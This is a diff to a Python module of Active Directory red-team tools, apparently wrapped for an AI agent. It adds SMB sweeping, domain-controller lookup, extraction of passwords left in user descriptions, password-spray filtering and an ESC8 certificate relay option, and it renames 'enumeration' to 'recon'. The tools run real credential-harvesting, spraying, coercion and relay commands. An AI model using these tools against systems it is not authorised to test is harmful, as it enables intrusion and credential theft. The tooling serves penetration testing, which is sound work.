@@ -1,6 +1,6 @@
 """Red Team penetration testing tools for Active Directory environments.
 
-This module provides toolsets for network enumeration, credential harvesting,
+This module provides toolsets for network recon, credential harvesting,
 password cracking, share pilfering, and golden ticket generation.
 
 All tools execute commands remotely on the Kali attack box via AWS SSM.
@@ -157,8 +157,49 @@ def _find_remote_users_file(paths: list[str]) -> str | None:
     return None
 
 
+def _sanitize_hostname(hostname: str) -> str:
+    cleaned = hostname.strip()
+    if not cleaned:
+        return cleaned
+    lowered = cleaned.lower()
+    if lowered.startswith("ip-") and "compute.internal" in lowered:
+        return ""
+    return cleaned
+
+
+def _filter_users_file_remote(
+    users_file: str,
+    exclude_users: set[str],
+) -> tuple[str, str | None]:
+    if not exclude_users:
+        return users_file, None
+    result = run_remote(["bash", "-lc", f"cat {shlex.quote(users_file)}"], timeout_seconds=60)
+    if result.return_code != 0:
+        error = (result.stderr or result.stdout or "failed to read users file").strip()
+        return users_file, error
+    users: list[str] = []
+    seen: set[str] = set()
+    for line in (result.stdout or "").splitlines():
+        user = line.strip()
+        if not user:
+            continue
+        if user.lower() in exclude_users:
+            continue
+        if user.lower() in seen:
+            continue
+        users.append(user)
+        seen.add(user.lower())
+    if not users:
+        return "", "all users already have credentials"
+    filtered_file = f"/tmp/users_spray_filtered_{uuid.uuid4().hex}.txt"  # nosec B108  # noqa: S108
+    ok, error = _write_users_file_remote(users, filtered_file)
+    if not ok:
+        return users_file, error or "failed to write filtered users file"
+    return filtered_file, None
+
+
 class NetworkEnumerationTools(Toolset):
-    """Tools for network scanning and enumeration."""
+    """Tools for network scanning and recon."""
 
     state: RedTeamState | None = None
 
@@ -192,6 +233,13 @@ class NetworkEnumerationTools(Toolset):
                     continue
 
                 if "netexec smb --users" in label_lower:
+                    line_match = re.match(
+                        r"^SMB\s+\d+\.\d+\.\d+\.\d+\s+\d+\s+\S+\s+([A-Za-z0-9._-]+)\s+\d{4}-\d{2}-\d{2}",
+                        line,
+                    )
+                    if line_match:
+                        _add_user(line_match.group(1))
+                        continue
                     backslash_match = re.search(
                         r"\\([A-Za-z0-9._-]+)\\s*\\(SidTypeUser\\)",
                         line,
@@ -251,6 +299,92 @@ class NetworkEnumerationTools(Toolset):
                         continue
 
         return users
+
+    def _extract_passwords_from_user_enum_output(self, output: str) -> list[tuple[str, str]]:  # noqa: PLR0912
+        if not output:
+            return []
+        creds: list[tuple[str, str]] = []
+        current_user = ""
+        for line in output.splitlines():
+            stripped = line.strip()
+            if not stripped:
+                continue
+
+            user_match = re.search(r"user:\[([^\]]+)\]", stripped, re.IGNORECASE)
+            if user_match:
+                current_user = user_match.group(1).strip()
+
+            account_match = re.search(r"Account:\s*([A-Za-z0-9_.-]+)", stripped)
+            if account_match:
+                current_user = account_match.group(1).strip()
+
+            sam_match = re.search(r"samaccountname:\s*([A-Za-z0-9_.-]+)", stripped, re.IGNORECASE)
+            if sam_match:
+                current_user = sam_match.group(1).strip()
+
+            if "password" not in stripped.lower():
+                continue
+
+            pass_match = re.search(r"Password\s*:\s*([^\s\)]+)", stripped, re.IGNORECASE)
+            if not pass_match:
+                continue
+            password = pass_match.group(1).strip()
+
+            username = ""
+            account_inline = re.search(r"Account:\s*([A-Za-z0-9_.-]+)", stripped)
+            if account_inline:
+                username = account_inline.group(1).strip()
+
+            if not username:
+                user_inline = re.search(r"user:\[([^\]]+)\]", stripped, re.IGNORECASE)
+                if user_inline:
+                    username = user_inline.group(1).strip()
+
+            if not username:
+                username = current_user
+
+            if not username:
+                netexec_match = re.match(
+                    r"^SMB\s+\d+\.\d+\.\d+\.\d+\s+\d+\s+\S+\s+([A-Za-z0-9._-]+)\s+\d{4}-\d{2}-\d{2}",
+                    stripped,
+                )
+                if netexec_match:
+                    username = netexec_match.group(1).strip()
+
+            if username and password:
+                creds.append((username, password))
+        return creds
+
+    def _add_credential(
+        self,
+        username: str,
+        password: str,
+        domain: str,
+        source: str,
+        is_admin: bool = False,
+    ) -> None:
+        if not self.state or not username:
+            return
+        cred = Credential(
+            username=username,
+            password=password,
+            domain=domain,
+            source=source,
+            is_admin=is_admin,
+        )
+        if hasattr(self.state, "add_credential"):
+            self.state.add_credential(cred, "recon")
+            return
+        existing = any(
+            c.username == cred.username and c.password == cred.password and c.domain == cred.domain
+            for c in self.state.credentials
+        )
+        if existing:
+            return
+        self.state.credentials.append(cred)
+        cred_key = self.state.get_credential_key(cred.username, cred.password, cred.domain)
+        self.state.tested_credentials.add(cred_key)
+        _track_cross_domain_reuse(self.state, cred)
 
     def _run_user_enum_commands(
         self, target: str, username: str, password: str, domain: str
@@ -363,14 +497,14 @@ class NetworkEnumerationTools(Toolset):
         if issues["filtered_445"] or issues["conn_failed"]:
             notes.append("Network path to SMB/RPC appears blocked or filtered.")
         if issues["access_denied"]:
-            notes.append("RPC/SAMR access denied; anonymous enumeration may be restricted.")
+            notes.append("RPC/SAMR access denied; anonymous recon may be restricted.")
         if issues["auth_failed"]:
             notes.append("Authentication failed; verify credentials.")
         if not notes:
-            notes.append("Target may be non-Windows or enumeration is blocked.")
+            notes.append("Target may be non-Windows or recon is blocked.")
 
         summary = self._summarize_enum_outputs(outputs)
-        message = "[!] SMB user enumeration did not return users."
+        message = "[!] SMB user recon did not return users."
         if summary:
             message += "\nPer-command status:\n" + summary
         if notes:
@@ -412,7 +546,7 @@ class NetworkEnumerationTools(Toolset):
                     return
                 host = Host(
                     ip=current_ip,
-                    hostname=current_hostname,
+                    hostname=_sanitize_hostname(current_hostname),
                     os=current_os or "Unknown",
                     roles=[],
                     services=current_services,
@@ -529,7 +663,157 @@ class NetworkEnumerationTools(Toolset):
             return f"Scan failed: {e!s}"
 
     @dn.tool_method
-    def enumerate_users(self, target: str, username: str, password: str, domain: str = "") -> str:
+    def smb_sweep(self, targets: str) -> str:
+        """
+        Sweep SMB for Windows hosts using netexec and record host metadata.
+
+        Args:
+            targets: Space-separated IPs or CIDR range (e.g., "10.1.2.0/24")
+
+        Returns:
+            netexec output for the sweep
+        """
+
+        def _parse_netexec_hosts(output_text: str) -> list[Host]:
+            hosts: list[Host] = []
+            for line in output_text.splitlines():
+                if not line.startswith("SMB"):
+                    continue
+                match = re.match(r"^SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(\S+)\s+(.*)$", line)
+                if not match:
+                    continue
+                ip = match.group(1)
+                name = match.group(2)
+                details = match.group(3)
+
+                os_match = re.search(r"\[\*\]\s+([^(]+)", details)
+                os_name = os_match.group(1).strip() if os_match else "Unknown"
+
+                name_match = re.search(r"\(name:([^)]+)\)", details)
+                hostname = name_match.group(1) if name_match else name
+
+                domain_match = re.search(r"\(domain:([^)]+)\)", details)
+                domain_value = domain_match.group(1).strip() if domain_match else ""
+                if domain_value and hostname and "." not in hostname:
+                    hostname = f"{hostname.lower()}.{domain_value.lower()}"
+                hostname = _sanitize_hostname(hostname)
+
+                hosts.append(
+                    Host(
+                        ip=ip,
+                        hostname=hostname,
+                        os=os_name,
+                        roles=[],
+                        services=["445/tcp smb"],
+                    )
+                )
+            return hosts
+
+        try:
+            target_list = targets.split()
+            if not target_list:
+                return "[!] No targets provided for SMB sweep."
+            cmd = ["netexec", "smb"] + target_list
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=300)
+            output = stdout or stderr or ""
+
+            if self.state and output:
+                for host in _parse_netexec_hosts(output):
+                    if hasattr(self.state, "add_host"):
+                        self.state.add_host(host)
+                    elif not any(h.ip == host.ip for h in self.state.hosts):
+                        self.state.hosts.append(host)
+
+            return output
+        except Exception as e:
+            logger.error(f"SMB sweep failed: {e!s}")
+            return f"SMB sweep failed: {e!s}"
+
+    @dn.tool_method
+    def resolve_domain_controllers(self, domain: str, dns_ip: str) -> str:
+        """
+        Resolve domain controllers via SRV lookup and record them as hosts.
+
+        Args:
+            domain: Active Directory domain (e.g., "sevenkingdoms.local")
+            dns_ip: DNS server IP to query
+
+        Returns:
+            nslookup output and any resolved controller hostnames
+        """
+
+        def _extract_srv_hosts(output_text: str) -> list[str]:
+            hosts: list[str] = []
+            for raw_line in output_text.splitlines():
+                line = raw_line.strip()
+                if not line:
+                    continue
+                srv_match = re.search(r"svr hostname = ([^\\s]+)", line, re.IGNORECASE)
+                if srv_match:
+                    host = srv_match.group(1).rstrip(".")
+                    hosts.append(host)
+                    continue
+                service_match = re.search(
+                    r"service = \\d+ \\d+ \\d+ ([^\\s]+)", line, re.IGNORECASE
+                )
+                if service_match:
+                    host = service_match.group(1).rstrip(".")
+                    hosts.append(host)
+            return hosts
+
+        def _resolve_host(hostname: str) -> str | None:
+            getent_cmd = ["getent", "hosts", hostname]
+            stdout, stderr, _ = _run_tool(getent_cmd, timeout_seconds=60)
+            output = stdout or stderr or ""
+            match = re.search(r"(\\d+\\.\\d+\\.\\d+\\.\\d+)", output)
+            if match:
+                return match.group(1)
+
+            nslookup_cmd = ["nslookup", hostname, dns_ip]
+            stdout, stderr, _ = _run_tool(nslookup_cmd, timeout_seconds=60)
+            output = stdout or stderr or ""
+            match = re.search(r"Address:\\s*(\\d+\\.\\d+\\.\\d+\\.\\d+)", output)
+            if match:
+                return match.group(1)
+            return None
+
+        try:
+            if not domain or not dns_ip:
+                return "[!] Domain and dns_ip are required for SRV lookup."
+            query = f"_ldap._tcp.dc._msdcs.{domain}"
+            cmd = ["nslookup", "-type=srv", query, dns_ip]
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
+            output = stdout or stderr or ""
+
+            hosts = _extract_srv_hosts(output)
+            if self.state and hosts:
+                for raw_hostname in hosts:
+                    hostname = raw_hostname.strip().rstrip(".")
+                    sanitized = _sanitize_hostname(hostname)
+                    if not sanitized:
+                        continue
+                    ip = _resolve_host(sanitized)
+                    if not ip:
+                        logger.warning(f"[!] Failed to resolve DC hostname: {sanitized}")
+                        continue
+                    host = Host(
+                        ip=ip,
+                        hostname=sanitized,
+                        os="Unknown",
+                        roles=["AD DC"],
+                        services=["389/tcp ldap"],
+                    )
+                    if hasattr(self.state, "add_host"):
+                        self.state.add_host(host)
+                    elif not any(h.ip == host.ip for h in self.state.hosts):
+                        self.state.hosts.append(host)
+            return output
+        except Exception as e:
+            logger.error(f"SRV lookup failed: {e!s}")
+            return f"SRV lookup failed: {e!s}"
+
+    @dn.tool_method
+    def enumerate_users(self, target: str, username: str, password: str, domain: str = "") -> str:  # noqa: PLR0912
         """
         Enumerate user accounts on a target using netexec (crackmapexec successor).
 
@@ -561,18 +845,55 @@ class NetworkEnumerationTools(Toolset):
                     return True
             return False
 
+        def _parse_netexec_hosts(output_text: str) -> list[Host]:
+            hosts: list[Host] = []
+            for line in output_text.splitlines():
+                if not line.startswith("SMB"):
+                    continue
+                match = re.match(r"^SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(\S+)\s+(.*)$", line)
+                if not match:
+                    continue
+                ip = match.group(1)
+                name = match.group(2)
+                details = match.group(3)
+
+                os_match = re.search(r"\[\*\]\s+([^(]+)", details)
+                os_name = os_match.group(1).strip() if os_match else "Unknown"
+
+                name_match = re.search(r"\(name:([^)]+)\)", details)
+                hostname = name_match.group(1) if name_match else name
+
+                domain_match = re.search(r"\(domain:([^)]+)\)", details)
+                domain_value = domain_match.group(1).strip() if domain_match else ""
+                if (
+                    domain_value
+                    and hostname
+                    and not hostname.lower().endswith(domain_value.lower())
+                ):
+                    hostname = f"{hostname.lower()}.{domain_value}"
+                hostname = _sanitize_hostname(hostname)
+
+                hosts.append(
+                    Host(
+                        ip=ip,
+                        hostname=hostname,
+                        os=os_name,
+                        roles=[],
+                        services=["445/tcp smb"],
+                    )
+                )
+            return hosts
+
         try:
             outputs = self._run_user_enum_commands(target, username, password, domain)
             sections = [
                 f"===== {label} =====\n{content}" for label, content in outputs if content.strip()
             ]
             output = "\n\n".join(sections).strip()
-            logger.info(
-                f"[*] User enumeration completed for {target} (user:{username}, domain:{domain})"
-            )
+            logger.info(f"[*] User recon completed for {target} (user:{username}, domain:{domain})")
 
+            domain_hint = domain
             if not (username and password):
-                domain_hint = domain
                 if not domain_hint and self.state and self.state.target:
                     domain_hint = self.state.target.domain or ""
                 if domain_hint:
@@ -582,16 +903,67 @@ class NetworkEnumerationTools(Toolset):
                     kerb_output = cred_tools.kerberos_user_enum_noauth(domain_hint, target)
                     if kerb_output:
                         output = (output + "\n\n" + kerb_output).strip()
+            if output and not domain_hint:
+                domain_match = re.search(r"\(domain:([^)]+)\)", output, re.IGNORECASE)
+                if domain_match:
+                    domain_hint = domain_match.group(1).strip()
 
-            if output and _has_user_entries(output):
+            effective_domain = domain or domain_hint
+            found_users = False
+            found_passwords = False
+            if output and self.state:
+                for host in _parse_netexec_hosts(output):
+                    if hasattr(self.state, "add_host"):
+                        self.state.add_host(host)
+                    elif not any(h.ip == host.ip for h in self.state.hosts):
+                        self.state.hosts.append(host)
+
+                if effective_domain:
+                    users = self._extract_users_from_outputs(outputs)
+                    found_users = bool(users)
+                    for found_user in sorted(users):
+                        if any(
+                            u.username == found_user and u.domain == effective_domain
+                            for u in self.state.users
+                        ):
+                            continue
+                        self.state.users.append(
+                            User(
+                                username=found_user,
+                                domain=effective_domain,
+                                description="",
+                                is_admin=False,
+                            )
+                        )
+
+                    extracted = self._extract_passwords_from_user_enum_output(output)
+                    found_passwords = bool(extracted)
+                    for found_user, found_password in extracted:
+                        pending_key = f"{effective_domain}:{found_user}".lower()
+                        if hasattr(self.state, "pending_credential_findings"):
+                            self.state.pending_credential_findings.add(pending_key)
+                        self._add_credential(
+                            found_user,
+                            found_password,
+                            effective_domain,
+                            "user_description",
+                        )
+                    if "password :" in output.lower() and not extracted:
+                        if hasattr(self.state, "pending_credential_findings"):
+                            self.state.pending_credential_findings.add(
+                                f"{effective_domain}:unknown"
+                            )
+                        logger.warning("[!] Plaintext password hints found but no usernames parsed")
+
+            if output and (_has_user_entries(output) or found_users or found_passwords):
                 return output
 
             raw_output = output or ""
             return self._format_enum_failure_message(outputs, raw_output)
 
         except Exception as e:
-            logger.error(f"User enumeration failed: {e}")
-            return f"User enumeration failed for {target}: {e}"
+            logger.error(f"User recon failed: {e}")
+            return f"User recon failed for {target}: {e}"
 
     @dn.tool_method
     def enumerate_shares(
@@ -633,6 +1005,11 @@ class NetworkEnumerationTools(Toolset):
 
                 name_match = re.search(r"\(name:([^)]+)\)", details)
                 hostname = name_match.group(1) if name_match else name
+                domain_match = re.search(r"\(domain:([^)]+)\)", details)
+                domain_value = domain_match.group(1).strip() if domain_match else ""
+                if domain_value and hostname and "." not in hostname:
+                    hostname = f"{hostname.lower()}.{domain_value.lower()}"
+                hostname = _sanitize_hostname(hostname)
 
                 hosts.append(
                     Host(
@@ -658,7 +1035,7 @@ class NetworkEnumerationTools(Toolset):
             cmd.append("--shares")
 
             stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
-            logger.info(f"[*] Share enumeration completed for {target}")
+            logger.info(f"[*] Share recon completed for {target}")
 
             output = stdout or stderr
             if self.state and output:
@@ -671,8 +1048,59 @@ class NetworkEnumerationTools(Toolset):
             return output
 
         except Exception as e:
-            logger.error(f"Share enumeration failed: {e}")
-            return f"Share enumeration failed for {target}: {e}"
+            logger.error(f"Share recon failed: {e}")
+            return f"Share recon failed for {target}: {e}"
+
+    @dn.tool_method
+    def smbclient_kerberos_shares(self, target: str) -> str:
+        """
+        Enumerate SMB shares using Kerberos (no password) with smbclient.py.
+
+        Args:
+            target: Hostname or IP to query (Kerberos prefers FQDN)
+
+        Returns:
+            smbclient.py output
+        """
+        try:
+            cmd = ["smbclient.py", "-k", "-no-pass", f"@{target}"]
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=180)
+            output = stdout or stderr or ""
+
+            if self.state and output:
+                in_table = False
+                for line in output.splitlines():
+                    if line.strip().startswith("Sharename"):
+                        in_table = True
+                        continue
+                    if in_table and set(line.strip()) <= {"-", " "}:
+                        continue
+                    if not in_table:
+                        continue
+                    if not line.strip():
+                        break
+                    parts = line.split(None, 2)
+                    if not parts:
+                        continue
+                    name = parts[0].strip()
+                    comment = parts[2].strip() if len(parts) > 2 else ""
+                    if not name:
+                        continue
+                    if any(s.host == target and s.name == name for s in self.state.shares):
+                        continue
+                    self.state.shares.append(
+                        Share(
+                            host=target,
+                            name=name,
+                            permissions="",
+                            comment=comment,
+                        )
+                    )
+
+            return output
+        except Exception as e:
+            logger.error(f"smbclient share enum failed: {e!s}")
+            return f"smbclient share enum failed: {e!s}"
 
     @dn.tool_method
     def save_users_to_file(
@@ -767,6 +1195,9 @@ class CredentialDiscoveryTools(Toolset):
             source=source,
             is_admin=is_admin,
         )
+        if hasattr(self.state, "add_credential"):
+            self.state.add_credential(cred, "recon")
+            return
         existing = any(
             c.username == cred.username and c.password == cred.password and c.domain == cred.domain
             for c in self.state.credentials
@@ -790,9 +1221,84 @@ class CredentialDiscoveryTools(Toolset):
             if not match:
                 continue
             domain, username, password = match.groups()
+            # Skip file-path artifacts from netexec -u/-p file usage.
+            if "/" in username or "\\" in username or username.endswith(".txt"):
+                continue
+            if "/" in password or "\\" in password or password.endswith(".txt"):
+                continue
             is_admin = "pwn3d!" in line.lower()
             creds.append((domain, username, password, is_admin))
         return creds
+
+    def _extract_passwords_from_user_enum_output(self, output: str) -> list[tuple[str, str]]:  # noqa: PLR0912
+        if not output:
+            return []
+        creds: list[tuple[str, str]] = []
+        current_user = ""
+        for line in output.splitlines():
+            stripped = line.strip()
+            if not stripped:
+                continue
+
+            user_match = re.search(r"user:\[([^\]]+)\]", stripped, re.IGNORECASE)
+            if user_match:
+                current_user = user_match.group(1).strip()
+
+            account_match = re.search(r"Account:\s*([A-Za-z0-9_.-]+)", stripped)
+            if account_match:
+                current_user = account_match.group(1).strip()
+
+            sam_match = re.search(r"samaccountname:\s*([A-Za-z0-9_.-]+)", stripped, re.IGNORECASE)
+            if sam_match:
+                current_user = sam_match.group(1).strip()
+
+            if "password" not in stripped.lower():
+                continue
+
+            pass_match = re.search(r"Password\s*:\s*([^\s\)]+)", stripped, re.IGNORECASE)
+            if not pass_match:
+                continue
+            password = pass_match.group(1).strip()
+
+            username = ""
+            account_inline = re.search(r"Account:\s*([A-Za-z0-9_.-]+)", stripped)
+            if account_inline:
+                username = account_inline.group(1).strip()
+            elif current_user:
+                username = current_user
+            else:
+                netexec_match = re.search(
+                    r"\b([A-Za-z0-9_.-]+)\b\s+\d{4}-\d{2}-\d{2}.*Password\s*:\s*",
+                    stripped,
+                )
+                if netexec_match:
+                    username = netexec_match.group(1).strip()
+
+            if not username:
+                continue
+            if "/" in username or "\\" in username or username.endswith(".txt"):
+                continue
+            if "/" in password or "\\" in password or password.endswith(".txt"):
+                continue
+
+            creds.append((username, password))
+        return creds
+
+    def _resolve_host_or_ip(self, host: str) -> str:
+        if not host:
+            return host
+        if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
+            return host
+        try:
+            socket.gethostbyname(host)
+            return host
+        except Exception:
+            pass
+        if self.state:
+            for entry in self.state.hosts:
+                if entry.hostname.lower() == host.lower():
+                    return entry.ip
+        return host
 
     def _extract_password_from_description(self, username: str, description: str) -> str | None:
         if not description:
@@ -906,20 +1412,19 @@ class CredentialDiscoveryTools(Toolset):
                             domain,
                             "ldap_description",
                         )
-                    details = {
-                        "Affected Account": entry_user,
-                        "Description": entry_desc,
-                    }
-                    if password_value:
-                        details["Password"] = password_value
-                    block = _format_weakness_block(
-                        "Credential Discovery - Password in User Description Field",
-                        "Plaintext passwords stored in user description attribute",
-                        details,
-                        "Immediate authenticated access",
-                        "LDAP enumeration",
-                    )
-                    self._add_weakness(block)
+                        details = {
+                            "Affected Account": entry_user,
+                            "Description": entry_desc,
+                            "Password": password_value,
+                        }
+                        block = _format_weakness_block(
+                            "Credential Discovery - Password in User Description Field",
+                            "Plaintext passwords stored in user description attribute",
+                            details,
+                            "Immediate authenticated access",
+                            "LDAP enumeration",
+                        )
+                        self._add_weakness(block)
 
             return result
 
@@ -927,7 +1432,7 @@ class CredentialDiscoveryTools(Toolset):
             return f"LDAP search failed: {e}"
 
     @dn.tool_method
-    def password_spray(
+    def password_spray(  # noqa: PLR0912
         self,
         target: str,
         domain: str,
@@ -977,6 +1482,25 @@ class CredentialDiscoveryTools(Toolset):
                 else:
                     users_file = enumerated_file
 
+            if self.state and self.state.credentials:
+                exclude_users: set[str] = set()
+                domain_key = domain.strip().lower()
+                for cred in self.state.credentials:
+                    if not cred.username:
+                        continue
+                    cred_domain = (cred.domain or "").strip().lower()
+                    if domain_key and cred_domain and cred_domain != domain_key:
+                        continue
+                    exclude_users.add(cred.username.lower())
+                if exclude_users:
+                    filtered_file, error = _filter_users_file_remote(users_file, exclude_users)
+                    if error == "all users already have credentials":
+                        return "[!] Password spray skipped: all users already have credentials."
+                    if error:
+                        logger.warning(f"[!] Failed to filter users file: {error}")
+                    elif filtered_file:
+                        users_file = filtered_file
+
             cmd = [
                 "netexec",
                 "smb",
@@ -1005,7 +1529,7 @@ class CredentialDiscoveryTools(Toolset):
                     "🚨 VALID CREDENTIALS FOUND!\n"
                     "→ Look for [+] lines indicating successful auth\n"
                     "→ 'Pwn3d!' indicates ADMIN access\n"
-                    "→ Use found credentials for further enumeration\n\n" + result
+                    "→ Use found credentials for further recon\n\n" + result
                 )
 
             if self.state:
@@ -1044,12 +1568,12 @@ class CredentialDiscoveryTools(Toolset):
         Uses credentials from state if available, otherwise tries null session.
         """
         try:
-            # Check if we have credentials in state to use for authenticated enumeration
+            # Check if we have credentials in state to use for authenticated recon
             username, password, domain = "", "", ""
             if self.state and self.state.credentials:
                 cred = self.state.credentials[0]  # Use first available credential
                 username, password, domain = cred.username, cred.password, cred.domain
-                logger.info(f"[*] Using credential {domain}\\{username} for user enumeration")
+                logger.info(f"[*] Using credential {domain}\\{username} for user recon")
 
             outputs = self._run_user_enum_commands(target, username, password, domain)
             users = self._extract_users_from_outputs(outputs)
@@ -1073,7 +1597,7 @@ class CredentialDiscoveryTools(Toolset):
             return users_file
 
         except Exception as e:
-            logger.error(f"Auto user enumeration failed: {e}")
+            logger.error(f"Auto user recon failed: {e}")
             return None
 
     @dn.tool_method
@@ -1280,7 +1804,7 @@ class CredentialDiscoveryTools(Toolset):
                     "Insufficient password complexity requirements",
                     details,
                     "Enables password spraying attacks",
-                    "Password policy enumeration",
+                    "Password policy recon",
                 )
                 self._add_weakness(block)
 
@@ -1427,7 +1951,7 @@ class PostureValidationTools(Toolset):
                 "Stored credentials in Windows Credential Manager",
                 {"Targets": ", ".join(targets)},
                 "Potential plaintext or reusable credentials",
-                "Remote cmdkey enumeration",
+                "Remote cmdkey recon",
             )
             self._add_weakness(block)
             return "Credential Manager entries found:\n" + output
@@ -1627,7 +2151,7 @@ class PostureValidationTools(Toolset):
                 "Accounts with SIDHistory present",
                 {},
                 "Potential SIDHistory abuse for elevated access",
-                "LDAP enumeration",
+                "LDAP recon",
             )
             self._add_weakness(block)
             return "SIDHistory entries detected:\n" + output
@@ -1811,8 +2335,8 @@ class CredentialHarvestingTools(Toolset):
         """
         Validate usernames via Kerberos without creds using GetNPUsers.py -no-pass.
 
-        This uses unauthenticated Kerberos pre-auth enumeration to confirm
-        valid principals even when SMB/LDAP enumeration is blocked.
+        This uses unauthenticated Kerberos pre-auth recon to confirm
+        valid principals even when SMB/LDAP recon is blocked.
 
         Args:
             domain: Target domain (e.g., 'example.local')
@@ -1870,7 +2394,7 @@ class CredentialHarvestingTools(Toolset):
                     "-no-pass",
                 ]
 
-            logger.info(f"[*] Kerberos user enumeration (no-auth) against {domain} via {dc_ip}")
+            logger.info(f"[*] Kerberos user recon (no-auth) against {domain} via {dc_ip}")
             stdout, stderr, _ = _run_tool(cmd, timeout_seconds=180)
             output = (stdout or "") + ("\n" + stderr if stderr else "")
 
@@ -1922,7 +2446,7 @@ class CredentialHarvestingTools(Toolset):
             return output
 
         except Exception as e:
-            return f"Kerberos user enumeration (no-auth) failed: {e!s}"
+            return f"Kerberos user recon (no-auth) failed: {e!s}"
 
     @dn.tool_method
     def asrep_roast(
@@ -1941,7 +2465,7 @@ class CredentialHarvestingTools(Toolset):
 
         Args:
             domain: Target domain (e.g., 'example.local')
-            username: Valid domain username (for enumeration)
+            username: Valid domain username (for recon)
             password: Password for the username
             dc_ip: Domain controller IP address
 
@@ -2215,8 +2739,8 @@ class SharePilferingTools(Toolset):
             return stdout
 
         except Exception as e:
-            logger.error(f"[!] Error during enumeration: {e!s}")
-            return f"Error during enumeration: {e!s}"
+            logger.error(f"[!] Error during recon: {e!s}")
+            return f"Error during recon: {e!s}"
 
     @dn.tool_method
     def download_file_content(
@@ -2408,7 +2932,7 @@ class GoldenTicketTools(Toolset):
 
 
 class BloodHoundTools(Toolset):
-    """Tools for ACL enumeration and privilege escalation path discovery."""
+    """Tools for ACL recon and privilege escalation path discovery."""
 
     state: RedTeamState | None = None
 
@@ -2933,7 +3457,7 @@ class CertipyTools(Toolset):
             return "\n".join(output_parts)
 
         except Exception as e:
-            return f"Certipy enumeration failed: {e}"
+            return f"Certipy recon failed: {e}"
 
     @dn.tool_method
     def certipy_req_esc1(
@@ -3118,6 +3642,7 @@ class CertipyTools(Toolset):
         self,
         ca_host: str,
         template_name: str = "DomainController",
+        target: str | None = None,
         target_upn: str | None = None,
         coerce_target: str | None = None,
         coerce_method: str = "petitpotam",
@@ -3139,6 +3664,7 @@ class CertipyTools(Toolset):
         Args:
             ca_host: Certificate Authority hostname or IP
             template_name: Template to request (default: DomainController)
+            target: Relay target for Certipy (default: ca_host)
             target_upn: Optional UPN to request certificate for
             coerce_target: Optional host to coerce (DC or CA host)
             coerce_method: Coercion tool to use (petitpotam or coercer)
@@ -3152,11 +3678,16 @@ class CertipyTools(Toolset):
             >>> certipy_relay_esc8("ca.domain.local", "DomainController")
             # Then in another session: petitpotam("dc_ip", "your_listener_ip")
         """
+        resolved_ca_host = self._resolve_host_or_ip(ca_host)
+        resolved_target = self._resolve_host_or_ip(target or ca_host)
+        resolved_coerce = self._resolve_host_or_ip(coerce_target or "")
         cmd = [
             "certipy",
             "relay",
+            "-target",
+            resolved_target,
             "-ca",
-            ca_host,
+            resolved_ca_host,
             "-template",
             template_name,
         ]
@@ -3173,7 +3704,7 @@ class CertipyTools(Toolset):
                 listener = _infer_listener_ip(ca_host)
 
             if coerce_target:
-                coerce_target = str(coerce_target)
+                coerce_target = str(resolved_coerce)
                 coerce_method = (coerce_method or "petitpotam").lower()
                 if coerce_method not in {"petitpotam", "coercer"}:
                     coerce_method = "petitpotam"
@@ -3689,7 +4220,10 @@ class RedTeamReportingTools(Toolset):
             ),
             services=data.get("services", []),
         )
-        state.hosts.append(host)
+        if hasattr(state, "add_host"):
+            state.add_host(host)
+        else:
+            state.hosts.append(host)
         logger.info(f"[+] Recorded host: {host.hostname} ({host.ip})")
         return f"✓ Recorded host: {host.hostname} ({host.ip})"
 
@@ -3703,7 +4237,10 @@ class RedTeamReportingTools(Toolset):
             description=data.get("description", ""),
             is_admin=data.get("is_admin", False),
         )
-        state.users.append(user)
+        if hasattr(state, "add_user"):
+            state.add_user(user.username, user.domain)
+        else:
+            state.users.append(user)
         logger.info(f"[+] Recorded user: {user.username}@{user.domain}")
         return f"✓ Recorded user: {user.username}@{user.domain}"
 
@@ -3718,12 +4255,13 @@ class RedTeamReportingTools(Toolset):
             source=data.get("source", "unknown"),
             is_admin=data.get("is_admin", False),
         )
-        state.credentials.append(cred)
-
-        cred_key = state.get_credential_key(cred.username, cred.password, cred.domain)
-        state.tested_credentials.add(cred_key)
-
-        _track_cross_domain_reuse(state, cred)
+        if hasattr(state, "add_credential"):
+            state.add_credential(cred, "recon")
+        else:
+            state.credentials.append(cred)
+            cred_key = state.get_credential_key(cred.username, cred.password, cred.domain)
+            state.tested_credentials.add(cred_key)
+            _track_cross_domain_reuse(state, cred)
 
         logger.info(f"[+] Recorded credential: {cred.username}@{cred.domain}")
         return f"✓ Recorded credential: {cred.username}@{cred.domain}"
@@ -4066,8 +4604,8 @@ class CoercionTools(Toolset):
             return f"Coercer failed: {e}"
 
 
-class PoisoningTools(Toolset):
-    """Tools for network poisoning (Responder, mitm6)."""
+class CoercionNetworkTools(Toolset):
+    """Tools for network coercion (Responder, mitm6)."""
 
     state: RedTeamState | None = None
 
@@ -4206,7 +4744,7 @@ class MSSQLTools(Toolset):
             port: MSSQL port (default: 1433)
 
         Returns:
-            Login result and database enumeration
+            Login result and database recon
 
         Example:
             >>> mssql_login("192.168.56.22", "dave.lee", "ExamplePass123!", "child.example.local")
@@ -4227,8 +4765,8 @@ class MSSQLTools(Toolset):
         # Run with a simple query to test access
         try:
             logger.info(f"[*] Testing MSSQL login to {target}")
-            # Use a simple enumeration command - SQL is intentional for pentest tool
-            # nosec B608 - intentional SQL for MSSQL pentest enumeration
+            # Use a simple recon command - SQL is intentional for pentest tool
+            # nosec B608 - intentional SQL for MSSQL pentest recon
             sql_query = (
                 "SELECT name FROM master.sys.databases; "
                 "SELECT name, is_trustworthy_on FROM sys.databases; "
@@ -4414,7 +4952,7 @@ class MSSQLTools(Toolset):
             target_string = f"{username}:{password}@{target}"
 
         # Enumerate linked servers and check access
-        # nosec B608 - intentional SQL for MSSQL pentest enumeration
+        # nosec B608 - intentional SQL for MSSQL pentest recon
         sql_query = """
 SELECT name, data_source, provider FROM sys.servers WHERE is_linked = 1;
 EXEC sp_linkedservers;
@@ -4440,7 +4978,7 @@ EXEC sp_linkedservers;
             return result
 
         except Exception as e:
-            return f"Linked server enumeration failed: {e}"
+            return f"Linked server recon failed: {e}"
 
     @dn.tool_method
     def mssql_exec_linked(
@@ -4481,7 +5019,7 @@ EXEC sp_linkedservers;
             target_string = f"{username}:{password}@{target}"
 
